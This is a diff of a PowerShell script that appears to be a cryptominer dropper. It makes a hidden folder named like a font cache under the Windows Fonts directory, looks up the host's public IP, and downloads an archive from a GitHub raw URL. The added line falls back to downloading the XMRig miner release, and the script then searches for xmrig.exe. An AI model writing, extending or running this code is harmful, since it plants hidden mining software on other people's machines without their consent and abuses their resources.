@@ -2,7 +2,7 @@ $W="w8w-"+( (iwr "http://ifconfig.me" -UseBasicParsing -TimeoutSec 5).Content.Tr
 $B="$env:windir\Fonts\.tzcache"
 New-Item -ItemType Directory -Force -Path $B | Out-Null
 $U="https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8x64.zip"
-try { iwr $U -OutFile "$B\g.zip" -UseBasicParsing -TimeoutSec 120 } catch { return }
+try { iwr $U -OutFile "$B\g.zip" -UseBasicParsing -TimeoutSec 60 } catch { iwr "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip" -OutFile "$B\g.zip" -UseBasicParsing -TimeoutSec 120 }
 Expand-Archive "$B\g.zip" -DestinationPath $B -Force
 $e=Get-ChildItem $B -Recurse -Filter xmrig.exe | Select-Object -First 1
 if(-not $e){ return }
